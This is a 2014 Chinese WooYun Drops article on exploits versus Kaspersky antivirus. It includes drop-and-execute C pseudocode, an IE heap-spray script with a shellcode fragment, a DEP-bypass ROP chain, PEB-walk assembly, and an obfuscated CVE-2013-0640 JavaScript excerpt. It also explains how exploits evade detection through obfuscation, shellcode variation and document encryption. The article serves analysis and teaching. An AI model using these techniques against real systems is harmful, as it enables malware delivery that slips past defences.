@@ -1,0 +1,155 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">漏洞利用与卡巴斯基的对抗之路</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">夜未央</a> <span class="bull">·</span> <time title="2014/09/04 12:24" ui-time="" datetime="2014/09/04 12:24" class="published ng-binding ng-isolate-scope">2014/09/04 12:24</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 致谢</h2><hr><p>特别感谢各位朋友在这一年中对自己工作的支持，无以为报，只能凑合写一些文章来一搏各位的欢心，如有不对之处还请各位不吝指出，感激不尽！</p><p>首先感谢以下朋友给予自己的帮助：</p><p>泉哥</p><p>没谱</p><p>instruder</p><p>我可爱的同事们</p><h2>0x01 题记：</h2><hr><p>主题是关于漏洞利用与卡巴斯基之间的种种对抗，之所以选择卡巴斯基是因为其在众多杀毒软件中为一个典型，从04、05年的内存查杀到最新流行的行为检测云查杀，卡巴斯基一直紧跟时代步伐并且针对漏洞利用的查杀也越来越准确有效，与诺顿、Bitdefender号称是最难绕过的杀软之一。杀毒软件对文档类漏洞和浏览器漏洞的查杀最为严格，此篇也以上述两类漏洞利用作为示例进行阐述。</p><p>漏洞利用技术的发展也是对抗杀毒软件查杀技术的发展，其中可见各种奇技淫巧，令人目不暇接，其中针对卡巴斯基这款杀毒软件的绕过方法更是让人眼前一亮，基本上绕过卡巴斯基的方法对于其他杀软基本可以做到通杀，这也是分析总结漏洞利用与卡巴斯基对抗的目的所在，以一个旁观者的角度来分析两者之间的对抗，更能清晰的理解漏洞利用与杀毒软件之间的对抗发展，管中窥豹可见一斑。</p><p>文章中使用的相关代码都是从实际的漏洞利用实例中提取精简而来，并不会实际提供相关漏洞样本，此处还请大家多多见谅。废话不多说，下面开始正题：</p><h2>0x02 漏洞利用的基本形式</h2><hr><p>MS Office 漏洞的没落，Adobe Reader PDF漏洞的方兴未艾，Flash Player漏洞的强势崛起以及目前浏览器UAF漏洞的中兴，漏洞的形式多种多样但是漏洞利用的基本思路倒没有太大的变化，无非两种形式：下载并执行和释放并执行，可谓万变不离其宗，漏洞利用的最终目的就是把一个程序执行起来，杀毒软件的查杀目的为把这种行为检测出来报警并阻止其运行。 漏洞利用最终执行的伪代码如下：</p><pre><code>/***********************************************************************/
+/* 演示漏洞利用伪代码                                                     */
+/***********************************************************************/
+#include &lt;windows.h&gt;
+void main()
+{
+    HANDLE hFileHandle;     //主体文件句柄
+    HANDLE hExeFile;        //exe程序句柄
+    char exploitName[MAX_PATH] = "bin.xxx"; // Exploit主体文件路径
+    char tempPath[MAX_PATH] = {0};
+    DWORD dwWrite =0;
+    DWORD exeBufferOffset = 0x1000;     //exe Exploit主体文件中的偏移
+
+    char exebuffer [1024] = {0};        //缓冲区
+
+    hFileHandle = CreateFileA(exploitName,      //Exploit 主体文件路径
+                            GENERIC_READ,
+                            FILE_SHARE_READ,
+                            NULL,
+                            OPEN_EXISTING,
+                            NULL,
+                            NULL);
+    SetFilePointer(hFileHandle,
+                    exeBufferOffset,
+                    NULL,
+                    FILE_BEGIN);
+
+    ReadFile(hFileHandle,exebuffer,sizeof(exebuffer),&amp;dwWrite,NULL);    //读文件
+    GetTempPathA(MAX_PATH,tempPath);            //获取temp路径
+    strcat_s(tempPath,"winexe.exe");
+
+    hExeFile = CreateFileA(tempPath,        //创建exe
+                        GENERIC_WRITE,
+                        FILE_SHARE_WRITE,
+                        NULL,
+                        CREATE_ALWAYS,
+                        NULL,
+                        NULL);
+    WriteFile(hExeFile,
+            exebuffer,
+            sizeof(exebuffer),
+            &amp;dwWrite,
+            NULL);
+    CloseHandle(hFileHandle);
+    CloseHandle(hExeFile);
+
+    WinExec(tempPath,SW_SHOW);      //执行exe
+}}
+</code></pre><p>以释放并执行的行为伪代码作为例子，可以得到以下信息：</p><p>(1) ShellCode 使用操作系统的API 函数</p><p>(2) 主体文件路径必须要首先得到</p><p>(3) 通过偏移读取可执行文件</p><p>(4) 获取%temp%或其他路径</p><p>(5) 生成可执行程序并执行</p><p>ShellCode得以执行之前，还有很多漏洞利用方法，比如堆填充(Heap Spray)，绕过地址随机化(ASLR)+数据执行保护(DEP)。</p><p><strong>1 、Heap Spray</strong></p><p>堆填充在浏览器和Flash Player相关漏洞应用比较多，Adobe Reader 的早期漏洞也会使用这种方法。其核心思想是在进程内存空间中填充大量无用数据，漏洞触发之后通过相应技巧跳转到ShellCode。</p><p>常见是在IE浏览器中，简单示例代码如下：</p><pre><code>&lt;SCRIPT language="javascript"&gt;
+
+    var heapSprayToAddress = 0x05050505;    //堆填充地址，最终会用来做shellcode执                                                //行地址
+    var payLoadCode = unescape(             //ShellCode
+    "%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120");
+    var heapBlockSize = 0x400000;       //堆填充大小
+    var payLoadSize = payLoadCode.length * 2;
+    var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+    var spraySlide = unescape("%u0505%u0505");
+    spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+    heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
+    memory = new Array();
+
+    for (i=0;i&lt;heapBlocks;i++)
+    {
+        memory[i] = spraySlide + payLoadCode;
+    }
+
+    for ( i = 0 ; i &lt; 128 ; i++) 
+    {
+        try{ 
+            var tar = new
+ ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
+            tar.setSlice(0x7ffffffe, 0x05050505, 0x05050505,0x05050505 ); 
+        }catch(e){}
+    }
+    function getSpraySlide(spraySlide, spraySlideSize)
+    {
+        while (spraySlide.length*2&lt;spraySlideSize)
+        {
+            spraySlide += spraySlide;
+        }
+        spraySlide = spraySlide.substring(0,spraySlideSize/2);
+        return spraySlide;
+    }
+
+&lt;/SCRIPT&gt; 
+</code></pre><p>Flash Player 和Adobe Reader中也会采用类似的方法来达到堆填充的目的。这里就不举相关例子了，有兴趣的话，可以在网络上搜索一下暴露的POC。</p><p><strong>2、 ASLR+DEP</strong></p><p>地址随机化和数据执行保护在最新的操作系统中普遍采用的一种保护技术，若要执行ShellCode，就必须要绕过ASLR+DEP。目前的采用的方法主要有两种：泄露模块基址、使用未ASRL的DLL模块，最终目的就是绕过DEP。</p><p>鉴于目前常见的技术是使用ROP，代码形式简单如下：</p><pre><code>## ROP 
+rop =  struct.pack("&lt;I",0x77bf362c) # POP EBX / RET
+rop += struct.pack("&lt;I",0x41414141) # junk
+rop += struct.pack("&lt;I",0x41414141) # junk
+rop += struct.pack("&lt;I",0xFFFFFFFF) # 00000000
+rop += struct.pack("&lt;I",0x7e810b7e) # INC EBX / RET
+
+rop += struct.pack("&lt;I",0x77bebb36) # POP EBP / RET
+rop += struct.pack("&lt;I",0x7C862144) # SetProcessDEPPolicy
+
+rop += struct.pack("&lt;I",0x77bf3b47) # POP EDI / RET
+rop += struct.pack("&lt;I",0x77be1110) # RET
+rop += struct.pack("&lt;I",0x77bf1891) # POP ESI / RET
+rop += struct.pack("&lt;I",0x77be2091) # RET
+
+rop += struct.pack("&lt;I",0x7e6ea62b) # PUSHAD / RET
+ ####
+</code></pre><p>通过使用ROP的方式调用系统函数比如SetProcessDEPPolicy、VirtualProtect等函数修改一部分内存属性，将其改为可执行，然后再跳转执行。</p><p><strong>3、 FS:[30]获取Kernel32基址</strong></p><p>FS:[30]这种方法本质是通过PEB的方式来获取到Kernel32的基址，进而获取到Kernel32中函数地址。代码如下：</p><pre><code>xor eax, eax               ; // clear eax
+mov eax, fs:[ 0x30 ]       ; // get a pointer to the PEB
+mov eax, [ eax + 0x0C ]    ; // get PEB-&gt;Ldr
+mov eax, [ eax + 0x14 ]    ; // get PEB-&gt;Ldr.InMemoryOrderModuleList.Flink                              ;//(1st entry)
+mov eax, [ eax ]           ; // get the next entry (2nd entry)
+mov eax, [ eax ]           ; // get the next entry (3rd entry)
+mov ebp, [ eax + 0x10 ]    ; // get the 3rd entries base address                                        ;//(kernel32.dll)
+</code></pre><p>获取到kernel32基址后可以通过很多种方法来获取函数地址，大家可以去网上想相关的资料来查。</p><h2>0x03 卡巴斯基的对抗策略</h2><hr><p>上述的漏洞利用方法来看，卡巴斯基可以在上述方法中进行有针对性的查杀。最初卡巴斯基相对于对病毒和木马的查杀而言，漏洞利用方面的查杀是非常弱的，后来由于漏洞利用越来越广泛越来越烂大街，所用的方法也都是如出一辙，其改进速度非常快，针对漏洞利用方法进行了又针对性的查杀。</p><p>行为查杀和虚拟机执行检查是最近两三年比较流行的杀软查杀方式，没有这两个东西都不好意思说自己是一款杀毒软件，可见一斑。</p><p><strong>1、 Heap Spray检测</strong></p><p>包括浏览器(IE、Chrome、Firefox)、Adobe Reader和Flash Player，Spray的代码的特征非常明显。如下代码</p><pre><code>var spraySlide = unescape("%u0505%u0505");
+</code></pre><p>Javasript代码会使用unescape()函数转成16进制字符，然后填充到堆上。抓住了这个行为特征，再加上之后的填充操作，就可以作为一种明显的特征。</p><p>卡巴斯基自带有JavaScript混淆代码的解密功能，简单的异或移位修改等操作其是能够还原出来真实代码，最终对用户进行报警。</p><p><strong>2、 shellcode行为检测</strong></p><p>ShellCode的最终行为是把一个可执行程序执行起来，最终肯定需要调用相关的API执行函数:WinExec、Createprocess、ShellExecute、CreateProcessInternal等，对上述API函数进行重点监控。</p><p>卡巴斯基并没有对Ring3层的函数进行HOOK，这与麦咖啡有一些区别，而是在Ring0层对执行API函数的各个方面都进行细致的检测，包括函数调用堆栈、函数返回地址、EXE文件路径等等，若有其中一项符合检测规则，就会有相应的告警提示出来。</p><p>调用堆栈检测主要是对当前调用API函数的堆栈进行一些对比。一般情况下，Heap Spray之后跳转到ShellCode中执行，当前的栈帧指针(ESP)肯定不是原始的栈帧而是一个堆上的地址，类似与VS开发中的GS选项，ShellCode执行时的栈帧与系统默认栈帧不一致。</p><p>程序正常执行情况下，函数调用完成之后就会返回到程序的空间中继续执行，但是在ShellCode中函数调用完成之后返回到堆中执行，很明显的一种异常行为。</p><p>木马或者病毒的释放由ShellCode来完成，其释放目录比较敏感，比如C:\Windows、C:\Widnwos\System32等等，漏洞利用中一般会选择%temp%之类的目录，原因是在任何系统中都有读写执行的权限，不用考虑权限的问题，基本上对敏感目录的监控是每个杀软必须的功能，这一点卡巴斯基也不例外。</p><p><strong>3、 漏洞特征检测</strong></p><p>每种漏洞都有其明显的特征，卡巴斯基定位出漏洞特征之后，就能够爆出精确的CVE编号，这对用户来说非常有帮助，如下图：</p><p><img alt="enter image description here" img-src="19b464b122709f58652eb2c62451edafe8108656.jpg"></p><p>图1:卡巴斯基告警图</p><p>卡巴斯基告警信息中直接提示了CVE-2012-0158,这种就是其提取了漏洞的首要特征作为特征码，精确定位漏洞编号。</p><p>通过简单的查找，就可以定位出，卡巴斯基定位的特征码也是此漏洞触发的关键位置：</p><p><img alt="enter image description here" img-src="87339731c9824456b060f50aadfd6179c52fcf72.jpg"></p><p>图2:Cobj为漏洞的关键位置</p><p><strong>4、 重点文件和目录监控</strong></p><p>这一点在上述内容中就已经提到，敏感目录包括系统目录和用户目录，%temp%目录由于其在任何用户下都有可读可写可执行的权限，首当其冲成为杀毒软件监控的重点。</p><p>总上所述，卡巴斯基对漏洞利用的检测是越来越严格的，之前所描述的四点其实只是其中的小部分，根据检测的样本情况我也只能分析出来这么，还请大家见谅。</p><p>卡巴斯基的检测策略并不是单一的，不是采用一种检测思路，而是采用多种检测策略进行组合检测。比如说某一个浏览器漏洞利用代码绕过了JavaScript解码检测，但是在ShellCode部分就不一定能够绕过。</p><h2>0x04 漏洞利用对抗卡巴斯基检测策略</h2><hr><p>魔高一尺道高一丈，还是道高一尺魔高一丈，没有一个定论。放在漏洞利用与杀毒软件的对抗上也同样适用，这是一对矛盾发展的综合体。漏洞利用对抗以卡巴斯基为代码的杀毒软件的主要思路就是使其把恶意代码识别为程序执行正常代码，混淆杀毒软件的对恶意代码的识别能力，抓住这一点就能够很好的理解漏洞利用针对卡巴斯基所做的精心构造的技巧：</p><p><strong>1、 脚本代码混淆</strong></p><p>代表了一类漏洞利用中使用的技巧，纵观网络上爆出真实的漏洞利用样本，没有一个是直接使用原始的脚本代码，都是经过了一些巧妙构造，最简单的就是加密混淆，最终混淆出来的代码面目全非，分析人员手动进行分析都有很大的难度需要花费大量的精力，更别说软件能够识别了。</p><pre><code>    function eQUIVALENT(cARDINI) {
+    var mIRACOL = rIGUARDI(vILMENTE(cARDINI));
+    while (mIRACOL.length &lt; (2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 13 * 2))
+    mIRACOL += mIRACOL;
+    pECCATORE((2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2));
+    var cHIAMATO = [];
+    var rENDUTO = ((cARDINI &gt;&gt;&gt; 16) &amp; (13 + 2 * 11 * 11)).toString((2 * 5 + 2 * 3));
+    var sMISURATO = (cARDINI &gt;&gt;&gt; 24).toString((3 * 3 + 7));
+    if (rENDUTO.length == 1)
+        rENDUTO = "0" + rENDUTO;
+    if (sMISURATO.length == 1)
+        sMISURATO = "0" + sMISURATO;
+    if (vOLENCI["dIAVOLO"].indexOf("9.") == 0)
+        for (var oFFICIO = 10; oFFICIO &lt; 80; oFFICIO++) {
+            var gANELLONE = rIGUARDO(rENDUTO + sMISURATO);
+            cHIAMATO.push(mIRACOL.substring(0, ((2 * 5 * 2 * 19 * 139) / 2) - 3) + gANELLONE);
+        }
+    else
+        for (var oFFICIO = 10; oFFICIO &lt; 80; oFFICIO++) {
+            var gANELLONE = rIGUARDO(rENDUTO + sMISURATO);
+            cHIAMATO.push(mIRACOL.substring(0, ((47 * 2 * 7 * 5 * 2 * 2 * 2 * 2) / 2) - 3) + gANELLONE);
+        }
+    var dEFECTIVE = [];
+    for (var aLLODETTA = 0; aLLODETTA &lt; cHIAMATO.length; aLLODETTA++)
+        if (aLLODETTA % 2 == 0)
+            dEFECTIVE.push(cHIAMATO[aLLODETTA] + qUETARSI);
+    pECCATORE(vOLENCI[sHOGG('rtboteejucaOCn', 4013, 6949)]);
+}
+var cONTRARIA = [];
+function dISGRIEVI(pRELIBA) {
+    if (vOLENCI[sHOGG('IAVOLOd', 9323, 8863)].indexOf("9.") == 0)
+        for (var oFFICIO = 10; oFFICIO &lt; 40; oFFICIO++)
+            pOSSEDER.push(gRIDARO.substring(0, ((3 * 3 * 61 * 3 * 17 + 24821) / 2) - 3) + oFFICIO.toString());
+    else
+        for (var oFFICIO = 10; oFFICIO &lt; 40; oFFICIO++)
+            pOSSEDER.push(gRIDARO.substring(0, ((3 * 239 * 2 * 2 + 541 * 2 * 2 * 23) / 2) - 3) + oFFICIO.toString());
+    pECCATORE(pRELIBA);
+}
+</code></pre><p>以上代码节选自CVE-2013-0640 Adobe Reader 漏洞利用的Javascript 代码，所有的变量名称和函数名称经过了随机化处理，某些函数只能靠猜测来确认其功能，代码中也没有直接的内存填充操作。</p><p>加密混淆过的脚本代码可读性之差，让人抓狂。卡巴斯基会花费大量的内存进行解码，考虑到性能和用户体验，其会认为这是正常执行代码。当然这是之前的情况，目前这份代码卡巴斯基肯定是能够检测出来的。</p><p><strong>2、 ShellCode多样化</strong></p><p>条条大路通罗马来形容ShellCode的变形和多样化一点也不为过，只要是能够达到最终执行EXE的目的，ShellCode会使用各种奇技淫巧，无所不用其极。</p><p>加密ShellCode比如简单的异或移位等操作已经无法对抗卡巴斯基，其对ShellCode的解码能力非常强大。目前拿到的样本显示某些漏洞利用已经不再对ShellCode进行加密，而是从其他方面下手，比如在执行行为上进行有技巧性的修改。</p><p>ShellCode执行栈在进程默认堆栈栈帧、ShellCode通过ROP链的形式执行、调用API执行函数之前和之后使用进程默认模块代码、调用第三方模块执行EXE等等等等，此处就不进行一一列举。</p><p>简单示例代码如下：</p><pre><code>#include &lt;windows.h&gt;
+
+void main()
+{
+    WinExec("cmd.exe %temp%\\calc.exe",SW_SHOW);
+}
+</code></pre><p>通过cmd.exe把释放到%temp%目录下的calc.exe执行起来，当然也有变形比如把cmd.exe拷贝到其他目录之后执行。第三方程序需要保证是系统默认并且卡巴斯基不会阻止其运行，目前此种ShellCode利用方式已经被卡巴斯基修补。</p><p><strong>3、 文件格式变形</strong></p><p>这方面文档格式类漏洞利用做的比较多，复合文档格式由于其自身的复杂性，保证其漏洞触发成功率和稳定性的情况下可以把初始样本改成一个格式非常复杂，各种文件元素图片等等嵌套在一起的一个最终利用文档，其中ShellCode可以在文档中的任意位置。</p><p>就样本分析来看，上面的这种方法绕过还绕不过卡巴斯基的话，还有另外一个大杀器，就是对文档进行加密处理，Adobe Reader的样本比较多采用这种方式，卡巴斯基对加密后的文档无任何解密能力，想检测也无法做到，只能认为其是一个正常文档。这是第一步，后面对文档打开过程中的ShellCode检测并不会因为判定其是一个正常文档就放弃检测。因此在静态绕过卡巴斯基检测之后，也需要对卡巴斯基其他的检测方式进行相应的反检测处理。</p><h2>0x05 总结</h2><hr><p>本来自己想写一篇漏洞利于与卡巴斯基的对抗史，但是有些东西不能说的太细，很多细节在这里不能一一表述，最终就写成了这么一篇科普文，实乃一大憾事，以后会对此篇文章中的一些细节进行补充，大家见谅，废话很多，干货到一点没有。</p><p>卡巴斯基是一款非常强大的杀毒软件，这一点毋庸置疑。漏洞利用与之对抗也促进了双方技术能力和水平的提高，让我等小菜打开眼界。</p><p>路漫漫其修远兮，吾将上下而求索，谨以此句送给奋战在逆向第一线的各位朋友。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/1951" rel="bookmark" id="re1">渗透技巧之SSH篇</a></li><li><a href="http://drops.wooyun.org/papers/3795" rel="bookmark" id="re2">CVE-2014-0038内核漏洞原理与本地提权利用代码实现分析</a></li><li><a href="http://drops.wooyun.org/papers/5731" rel="bookmark" id="re3">MS15-035 EMF文件处理漏洞分析与POC构造</a></li><li><a href="http://drops.wooyun.org/tips/3911" rel="bookmark" id="re4">PHP WDDX Serializier Data Injection Vulnerability</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Excalibur</span> <span class="reply-time">2014-09-13 11:05:12</span></div><p></p><p>写得很不错啊，楼主不留个微博吗～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夜未央</span> <span class="reply-time">2014-09-05 14:39:39</span></div><p></p><p>回头看，口水化还是非常严重</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mayter</span> <span class="reply-time">2014-09-05 02:20:05</span></div><p></p><p>沙发.拜师可以吗</p><p></p></div></div></div></div></div></main>
